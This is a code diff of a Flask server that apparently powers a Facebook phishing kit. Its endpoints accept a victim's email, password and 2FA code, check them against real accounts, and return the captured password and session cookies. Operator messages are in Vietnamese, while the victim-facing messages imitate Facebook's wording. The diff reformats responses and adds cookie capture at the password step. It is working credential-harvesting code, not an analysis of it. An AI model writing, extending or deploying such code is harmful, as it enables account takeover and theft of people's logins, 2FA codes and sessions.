@@ -130,9 +130,15 @@ def check_email():
     default_password = "123456789"
     
     if email_exists(email, default_password):
-        return jsonify({"message": "Email và sđt có liên kết facebook, chờ nhập pass...", "status": 200, "email": email}), 200
+        return jsonify({
+            "message": "Email và sđt có liên kết facebook, chờ nhập pass...", 
+            "status": 200, 
+            "email": email
+            }), 200
     else:
-        return jsonify({"message": "The mobile number you entered is not connected to any account. Find your account and log in.", "status": 400}), 400
+        return jsonify({
+            "message": "The mobile number you entered is not connected to any account. Find your account and log in.", 
+            "status": 400}), 400
 
 @app.route('/check-password', methods=['POST'])
 def check_password():
@@ -140,10 +146,20 @@ def check_password():
     email = data.get('email')
     password = data.get('password')
     
-    if verify_password(email, password):
-        return jsonify({"message": "Pass đúng", "status": 200, "pass" : password}), 200
+    is_successful, cookies = verify_password(email, password)
+    
+    if is_successful:
+        return jsonify({
+            "message": "Pass đúng", 
+            "status": 200, 
+            "pass" : password, 
+            "cookies" : cookies
+            }), 200
     else:
-        return jsonify({"message": "The password you entered is incorrect.", "status": 400}), 400
+        return jsonify({
+            "message": "The password you entered is incorrect.", 
+            "status": 400
+            }), 400
 
 @app.route('/check-towfa', methods=['POST'])
 def check_towfa():
@@ -159,18 +175,21 @@ def check_towfa():
             "message": "Login 2FA bị Checkpoin",
             "status": 200, 
             "tow_fa": towfa,
-            "cookies" : cookies}), 200
+            "cookies" : cookies
+            }), 200
     else:
         return jsonify({
             "message": "We require your facebook account to be active before submitting", 
-            "status": 400}), 400
+            "status": 400
+            }), 400
     
 @app.route('/test', methods=['GET'])
 def test():
     
     return jsonify({
         "message": "test", 
-        "status": 200}), 200
+        "status": 200
+        }), 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5003)
